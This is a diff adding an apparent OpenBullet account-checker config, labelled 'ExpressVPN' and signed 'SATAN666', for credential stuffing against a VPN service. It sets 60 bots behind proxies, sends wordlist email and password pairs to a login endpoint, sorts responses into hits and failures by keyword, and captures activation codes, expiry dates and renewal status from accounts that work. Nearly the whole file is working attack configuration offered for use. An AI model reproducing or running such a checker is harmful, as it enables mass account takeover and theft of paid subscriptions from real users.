@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "ExpressVPN",
+  "SuggestedBots": 60,
+  "LastModified": "2019-04-03T00:14:54.3733029+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.jfciocb.net/vpn_servers?email=<USER>&password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authentication failed" 
+    KEY "Payment Verification Needed" 
+  KEYCHAIN Success OR 
+    KEY "<subscription>" 
+PARSE "<SOURCE>" LR "\"name\":\"code\",\"value\":\"<long_activation_code>" "<" -> CAP "Code (Activate):" 
+PARSE "<SOURCE>" LR "{\"name\":\"exp\",\"value\":\"<expiration_date>" "<" -> CAP "Expiry Date:" 
+PARSE "<SOURCE>" LR "\"name\":\"autoRenew\",\"value\":\"<billing_cycle>" "<" -> CAP "Auto Renew:" 
